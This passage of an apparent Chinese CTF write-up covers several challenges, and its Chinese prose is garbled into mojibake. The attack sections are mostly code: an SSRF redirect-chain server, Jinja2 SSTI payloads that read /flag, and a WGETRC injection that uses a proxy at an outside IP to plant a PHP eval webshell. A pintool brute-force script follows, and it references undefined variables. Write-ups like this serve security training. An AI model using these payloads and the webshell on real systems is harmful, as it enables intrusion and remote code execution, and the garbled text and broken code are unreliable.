</span></span><span class=line><span class=cl>    <span class=nt>&#34;args&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nt>&#34;_genkey_0&#34;</span><span class=p>:</span> <span class=s2>&#34;/step3/**&#34;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>}]</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>ç„¶åè®¿é—® /webjars/flag å°±èƒ½è·å¾— flagï¼Œè™½ç„¶æœ€åæ˜¯ 404 ä½†æ˜¯ä¸å½±å“</p><p><img src=/img/2025-QWNT/1.png alt=img></p><h2 id=safesecret>safesecret</h2><p>æ¼æ´ç‚¹åœ¨è¿™é‡Œçš„ssti</p><p><img src=/img/2025-QWNT/2.png alt=img></p><p>è·å–secret, è¿™é‡Œéœ€è¦ssrf</p><p><img src=/img/2025-QWNT/3.png alt=img></p><p>è¿™ä¸€æ­¥å¯ä»¥ç›´æ¥aié—®å‡ºæ¥</p><p>exploit_server.py:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>http.server</span> <span class=kn>import</span> <span class=n>BaseHTTPRequestHandler</span><span class=p>,</span> <span class=n>HTTPServer</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>CHAIN</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;/1&#34;</span><span class=p>:</span> <span class=s2>&#34;/2&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;/2&#34;</span><span class=p>:</span> <span class=s2>&#34;/3&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;/3&#34;</span><span class=p>:</span> <span class=s2>&#34;/4&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;/4&#34;</span><span class=p>:</span> <span class=s2>&#34;/5&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;/5&#34;</span><span class=p>:</span> <span class=s2>&#34;/6&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;/6&#34;</span><span class=p>:</span> <span class=s2>&#34;http://127.0.0.1:5000/_internal/secret&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Handler</span><span class=p>(</span><span class=n>BaseHTTPRequestHandler</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>do_GET</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>nxt</span> <span class=o>=</span> <span class=n>CHAIN</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>path</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>send_response</span><span class=p>(</span><span class=mi>200</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>nxt</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>send_header</span><span class=p>(</span><span class=s2>&#34;Refresh&#34;</span><span class=p>,</span> <span class=sa>f</span><span class=s2>&#34;0; url=</span><span class=si>{</span><span class=n>nxt</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>send_header</span><span class=p>(</span><span class=s2>&#34;Content-Type&#34;</span><span class=p>,</span> <span class=s2>&#34;text/plain&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>end_headers</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>wfile</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;chain step&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>HTTPServer</span><span class=p>((</span><span class=s2>&#34;0.0.0.0&#34;</span><span class=p>,</span> <span class=mi>8000</span><span class=p>),</span> <span class=n>Handler</span><span class=p>)</span><span class=o>.</span><span class=n>serve_forever</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p>è¯·æ±‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=o>/</span><span class=n>fetch</span><span class=err>?</span><span class=n>url</span><span class=o>=</span><span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=n>vps_ip</span><span class=p>:</span><span class=mi>8000</span><span class=o>/</span><span class=mi>1</span>
</span></span></code></pre></td></tr></table></div></div><p>å¯ä»¥è·å–åˆ°secret</p><p>æ¥ä¸‹æ¥æ˜¯ç»•è¿‡waf, é¢˜ç›®æŠŠconfig banäº†, ä¸èƒ½ç›´æ¥å¾€configä¸­å­˜å¯¹è±¡æ¥ç¼©å°paylaodé•¿åº¦</p><p>æ³¨æ„åˆ°</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=n>app</span><span class=o>.</span><span class=n>jinja_env</span><span class=o>.</span><span class=n>globals</span><span class=o>.</span><span class=n>update</span><span class=p>(</span><span class=n>sget</span><span class=o>=</span><span class=n>sget</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>app</span><span class=o>.</span><span class=n>jinja_env</span><span class=o>.</span><span class=n>globals</span><span class=o>.</span><span class=n>update</span><span class=p>(</span><span class=n>sset</span><span class=o>=</span><span class=n>sset</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>é¢˜ç›®æŠŠssetå’Œsgetæ³¨å†Œåˆ°äº†app.jinja_env.globalsä¸­, è¿™ä½¿å¾—æˆ‘ä»¬å¯ä»¥åœ¨payloadä¸­ç›´æ¥ä½¿ç”¨è¿™ä¸¤ä¸ªå‡½æ•°, å¹¶ä¸”å¯ä»¥é€šè¿‡ç±»ä¼¼<code>sset.__globals__</code>æ‹¿åˆ°å®ƒçš„__globals__</p><p>å¹¶ä¸”é¢˜ç›®æœ‰ä¸€ä¸ªreadå‡½æ•°</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=k>def</span> <span class=nf>read</span><span class=p>(</span><span class=n>f</span><span class=p>):</span> <span class=k>return</span> <span class=nb>open</span><span class=p>(</span><span class=n>f</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p><img src=/img/2025-QWNT/4.png alt=img></p><p>æˆ‘ä»¬å¯ä»¥ä»<code>sset.__globals__</code>ç›´æ¥è·å–åˆ°, å¹¶ä¸”ä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨ssetæŠŠæŸäº›å­—ç¬¦ä¸²å­˜è¿›session</p><p>æœ€ç»ˆæ„é€ å‡ºä»¥ä¸‹payload</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Bash data-lang=Bash><span class=line><span class=cl><span class=o>{</span>% print<span class=o>(</span>sset<span class=o>(</span><span class=s1>&#39;g&#39;</span>,request.args.a<span class=o>))</span> %<span class=o>}</span><span class=p>&amp;</span><span class=nv>a</span><span class=o>=</span>__globals__
</span></span><span class=line><span class=cl><span class=o>{</span>% print<span class=o>(</span>sset<span class=o>(</span><span class=s1>&#39;f&#39;</span>,request.args.a<span class=o>))</span> %<span class=o>}</span><span class=p>&amp;</span><span class=nv>a</span><span class=o>=</span>/flag
</span></span><span class=line><span class=cl><span class=o>{</span>%print<span class=o>(</span>sset<span class=o>[</span>sget<span class=o>(</span><span class=s1>&#39;g&#39;</span><span class=o>)][</span><span class=s1>&#39;rea&#39;&#39;d&#39;</span><span class=o>](</span>sget<span class=o>(</span><span class=s1>&#39;f&#39;</span><span class=o>)))</span>%<span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>åˆ†ä¸‰æ¬¡æ‰§è¡Œå³å¯</p><h2 id=smallcode>smallcode</h2><p>å‚è€ƒï¼š<a href=https://yenannn.github.io/2022/05/30/startctf%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%B3%A8%E5%85%A5%E7%9A%84%E6%94%B9%E7%BC%96/>startctfç¯å¢ƒå˜é‡æ³¨å…¥çš„æ”¹ç¼–</a></p><p>åŸé¢˜ç›´æ¥ï¼Œwpç…§ç€å¤ç°ä¸€é</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Bash data-lang=Bash><span class=line><span class=cl><span class=nv>http_proxy</span><span class=o>=</span>156.238.233.111:5566
</span></span><span class=line><span class=cl><span class=nv>output_document</span><span class=o>=</span>/var/www/html/shell.php
</span></span></code></pre></td></tr></table></div></div><p>ç®€å•ç¼–ç ä¸€ä¸‹å†…å®¹</p><p>context=aHR0cF9wcm94eT0xNTYuMjM4LjIzMy4xMTE6NTU2Ng0Kb3V0cHV0X2RvY3VtZW50PS92YXIvd3d3L2h0bWwvc2hlbGwucGhw</p><p>è®¿é—®/1.txtç¡®è®¤æ˜¯å¦æ­£å¸¸è¾“å…¥</p><p>vpsèµ·ä¸€ä¸ªå†…å®¹</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Bash data-lang=Bash><span class=line><span class=cl>&lt;?php phpinfo<span class=o>()</span><span class=p>;</span>@eval<span class=o>(</span><span class=nv>$_POST</span><span class=o>[</span><span class=s1>&#39;orange&#39;</span><span class=o>])</span><span class=p>;</span>?&gt;
</span></span></code></pre></td></tr></table></div></div><p>èµ·ä¸€ä¸ªpython</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>flask</span> <span class=kn>import</span> <span class=n>Flask</span><span class=p>,</span> <span class=n>make_response</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>app</span> <span class=o>=</span> <span class=n>Flask</span><span class=p>(</span><span class=vm>__name__</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s2>&#34;/&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>index</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;1.txt&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span> 
</span></span><span class=line><span class=cl>        <span class=n>r</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>response</span> <span class=o>=</span> <span class=n>make_response</span><span class=p>(</span><span class=n>r</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>response</span><span class=o>.</span><span class=n>headers</span><span class=p>[</span><span class=s1>&#39;Content-Type&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=s1>&#39;text/plain&#39;</span>
</span></span><span class=line><span class=cl>        <span class=n>response</span><span class=o>.</span><span class=n>headers</span><span class=p>[</span><span class=s1>&#39;Content-Disposition&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=s1>&#39;attachment; filename=1.txt&#39;</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>response</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>app</span><span class=o>.</span><span class=n>run</span><span class=p>(</span><span class=n>debug</span><span class=o>=</span><span class=kc>True</span><span class=p>,</span> <span class=n>host</span><span class=o>=</span><span class=s1>&#39;0.0.0.0&#39;</span><span class=p>,</span> <span class=n>port</span><span class=o>=</span><span class=mi>5566</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>è¿™æ—¶å€™è¾“å…¥</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Bash data-lang=Bash><span class=line><span class=cl><span class=nv>env</span><span class=o>=</span><span class=nv>WGETRC</span><span class=o>=</span>/var/www/html/1.txt
</span></span></code></pre></td></tr></table></div></div><p><img src=/img/2025-QWNT/5.png alt=img></p><p><img src=/img/2025-QWNT/6.png alt=img></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Bash data-lang=Bash><span class=line><span class=cl>find / -perm -4000 -type f -exec ls -la <span class=o>{}</span> 2&gt;/dev/null <span class=se>\;</span>
</span></span></code></pre></td></tr></table></div></div><p><img src=/img/2025-QWNT/7.png alt=img></p><h2 id=ecshop>ecshop</h2><p>ä¸å‘Šè¯‰ä½ ï¼Œè¿™ä¸ªå°±æ˜¯å¾ˆ ezï¼Œè‡ªå·±å®¡ä»£ç å»å§</p><p><img src=/img/2025-QWNT/19.png alt=img></p><h1 id=reverse>Reverse</h1><h2 id=hyperjump>HyperJump</h2><p>Vmé€»è¾‘å¤ªå¤æ‚ä¸æƒ³çœ‹ï¼Œå‘ç°å‡½æ•°æ˜¯å•å­—èŠ‚åŠ å¯†ï¼ˆæ¯æ¬¡æ¯”è¾ƒä¸€ä¸ªå­—èŠ‚ï¼‰ï¼Œå› æ­¤ç›´æ¥pintoolçˆ†ç ´äº†ï¼Œå› ä¸ºé”™è¯¯ä¼šæå‰é€€å‡ºï¼Œå¯¼è‡´æŒ‡ä»¤æ‰§è¡Œæ•°ç›®å¤§å¤§å‡å°‘</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span><span class=lnt>83
</span><span class=lnt>84
</span><span class=lnt>85
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>string</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>FLAG_LEN</span> <span class=o>=</span> <span class=mi>24</span>                 <span class=c1># æ ‡å¿—é•¿åº¦</span>
</span></span><span class=line><span class=cl><span class=n>CHARSET</span> <span class=o>=</span> <span class=n>string</span><span class=o>.</span><span class=n>ascii_lowercase</span><span class=o>+</span><span class=n>string</span><span class=o>.</span><span class=n>digits</span><span class=o>+</span><span class=s2>&#34;_@</span><span class=si>{}</span><span class=s2>&#34;</span>  <span class=c1># çˆ†ç ´å­—ç¬¦é›† (a-zA-Z)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># è®¾ç½® pwntools ä¸Šä¸‹æ–‡</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;info&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_inscount</span><span class=p>(</span><span class=n>payload</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>    è¿è¡Œ pin å¹¶è¿”å›æŒ‡ä»¤æ•°ã€‚
</span></span></span><span class=line><span class=cl><span class=s2>    æ¯æ¬¡çŒœæµ‹éƒ½å¿…é¡»å¯åŠ¨ä¸€ä¸ªæ–°è¿›ç¨‹ã€‚
</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>isinstance</span><span class=p>(</span><span class=n>payload</span><span class=p>,</span> <span class=nb>str</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>payload</span> <span class=o>=</span> <span class=n>payload</span><span class=o>.</span><span class=n>encode</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=c1># å¯åŠ¨è¿›ç¨‹</span>
</span></span><span class=line><span class=cl>        <span class=c1># æ³¨æ„ï¼šPin å¯èƒ½ä¼šå°†æŒ‡ä»¤æ•°è¾“å‡ºåˆ° stderr</span>
</span></span><span class=line><span class=cl>        <span class=n>p</span> <span class=o>=</span> <span class=n>process</span><span class=p>([</span><span class=s2>&#34;./pin -t inscount0_cout.so -- ./hyperjump&#34;</span><span class=p>],</span> <span class=n>shell</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Provide the flag:</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=n>out</span> <span class=o>=</span> <span class=n>p</span><span class=o>.</span><span class=n>recvall</span><span class=p>(</span><span class=n>timeout</span><span class=o>=</span><span class=mi>100</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>out</span><span class=o>.</span><span class=n>decode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=n>p</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>lines</span> <span class=o>=</span> <span class=n>out</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>line</span> <span class=ow>in</span> <span class=nb>reversed</span><span class=p>(</span><span class=n>lines</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>line</span><span class=o>.</span><span class=n>isdigit</span><span class=p>():</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=nb>int</span><span class=p>(</span><span class=n>line</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=n>log</span><span class=o>.</span><span class=n>warning</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;æ— æ³•ä» &#39;</span><span class=si>{</span><span class=n>pin_output</span><span class=si>}</span><span class=s2>&#39; ä¸­è§£æå‡ºæŒ‡ä»¤æ•°&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>log</span><span class=o>.</span><span class=n>error</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;æ‰§è¡Œ payload </span><span class=si>{</span><span class=n>payload</span><span class=si>}</span><span class=s2> æ—¶å‡ºé”™: </span><span class=si>{</span><span class=n>e</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># --- çˆ†ç ´ä¸»å¾ªç¯ ---</span>
</span></span><span class=line><span class=cl><span class=n>known_flag</span> <span class=o>=</span> <span class=nb>list</span><span class=p>(</span><span class=s2>&#34;flag{m4z3d_vm_jump&#34;</span><span class=p>)</span><span class=o>+</span><span class=nb>list</span><span class=p>(</span><span class=s2>&#34;A&#34;</span> <span class=o>*</span> <span class=p>(</span><span class=n>FLAG_LEN</span><span class=o>-</span><span class=mi>18</span><span class=p>))</span> <span class=c1># ä» &#34;AAAA...&#34; å¼€å§‹</span>
</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;å¼€å§‹çˆ†ç ´ </span><span class=si>{</span><span class=n>BINARY_PATH</span><span class=si>}</span><span class=s2>ï¼Œé•¿åº¦ </span><span class=si>{</span><span class=n>FLAG_LEN</span><span class=si>}</span><span class=s2>ï¼Œå­—ç¬¦é›† </span><span class=si>{</span><span class=n>CHARSET</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>18</span><span class=p>,</span> <span class=n>FLAG_LEN</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;æ­£åœ¨çˆ†ç ´ç¬¬ </span><span class=si>{</span><span class=n>i</span><span class=si>}</span><span class=s2> ä½...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=n>max_count</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=n>best_char</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=c1># éå†æ‰€æœ‰å¯èƒ½çš„å­—ç¬¦</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>char</span> <span class=ow>in</span> <span class=n>CHARSET</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=c1># æ„é€ æµ‹è¯• payload</span>
</span></span><span class=line><span class=cl>        <span class=n>current_test</span> <span class=o>=</span> <span class=nb>list</span><span class=p>(</span><span class=n>known_flag</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>current_test</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>char</span>
</span></span><span class=line><span class=cl>        <span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>current_test</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=c1># è·å–æŒ‡ä»¤æ•°</span>
</span></span><span class=line><span class=cl>        <span class=n>count</span> <span class=o>=</span> <span class=n>get_inscount</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>count</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>count</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>log</span><span class=o>.</span><span class=n>warning</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;å­—ç¬¦ &#39;</span><span class=si>{</span><span class=n>char</span><span class=si>}</span><span class=s2>&#39; è·å–è®¡æ•°å¤±è´¥ï¼Œè·³è¿‡...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>continue</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=c1># è°ƒè¯•ä¿¡æ¯</span>
</span></span><span class=line><span class=cl>        <span class=c1># log.debug(f&#34;æµ‹è¯•: {payload} -&gt; {count} æ¡æŒ‡ä»¤&#34;)</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=c1># æ›´æ–°æœ€å¤§å€¼</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>count</span> <span class=o>&gt;</span> <span class=n>max_count</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>max_count</span> <span class=o>=</span> <span class=n>count</span>
</span></span><span class=line><span class=cl>            <span class=n>best_char</span> <span class=o>=</span> <span class=n>char</span>
</span></span><span class=line><span class=cl>            <span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;å‘ç°æ–°çš„æœ€å¤§å€¼: å­—ç¬¦ &#39;</span><span class=si>{</span><span class=n>best_char</span><span class=si>}</span><span class=s2>&#39; -&gt; </span><span class=si>{</span><span class=n>max_count</span><span class=si>}</span><span class=s2> æ¡æŒ‡ä»¤&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>best_char</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>known_flag</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>best_char</span>
